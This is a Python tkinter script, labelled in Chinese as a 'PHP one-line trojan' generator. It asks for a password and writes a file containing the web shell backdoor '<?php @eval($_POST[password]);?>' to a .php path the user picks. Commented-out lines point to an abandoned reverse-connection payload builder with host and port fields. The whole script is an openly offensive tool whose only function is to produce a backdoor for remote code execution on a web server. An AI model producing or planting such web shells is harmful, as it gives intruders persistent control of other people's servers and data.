from tkinter import*
from tkinter import filedialog, dialog
#import os
from tkinter import messagebox
file_path = ''
file_text = ''
password = ''
bools = False

options = {}
options['defaultextension'] = ".php"
options['filetypes'] = (("Foo files", ".php"), ("Bar files", ".txt"), ("All files", "*"))
options['initialdir'] = ""
options['initialfile'] = ""
options['title'] = "Save as..."

def summon_php(password):
    buf = '<?php @eval($_POST[' + password + ']);?>'

    return buf

    #return buf
def save():
    global file_path
    global file_text
    password = en.get()
    #lport = en_1.get()
    #file_text = summon_python(lhost=lhost,lport=lport)
    
    file_path = filedialog.asksaveasfilename(**options)
    print('保存文件：', file_path)
    
def summon():
    global file_text
    global file_path
    password = en.get()
    file_text = summon_php(password)

    if file_path is not None:
        with open(file_path,"w") as f:
            f.write(file_text)
        #messagebox.showinfo("windows","开始打包")
        #cmd = 'pyinstaller -F -w '+file_path
        #os.system(cmd)
        #messagebox.showinfo("windows","生成完毕")
        #copy_cmd = "copy dist "+file_path
        #os.system(copy_cmd)
        
#---------------------------------------------------
tk = Tk()
tk.title('php一句话木马')
tk.geometry('280x130+420+200')
#----------------------------------------------------
en = Entry(tk)
en.place(x=80,y=30)
#en_1 = Entry(tk)
#en_1.place(x=80,y=50)

#--------------------------text------------------
w= Label(tk,text='密码:',fg="red")
w.place(x=20,y=30)
#w_2= Label(tk,text='端口:',fg="red")
#w_2.place(x=20,y=50)
#------------------------start or stop----------------
b = Button(tk, text ="选择路径", command=save)
b.place(x=20,y=65)
b_2 = Button(tk, text ="生成", command=summon)
b_2.place(x=200,y=65)
tk.mainloop()
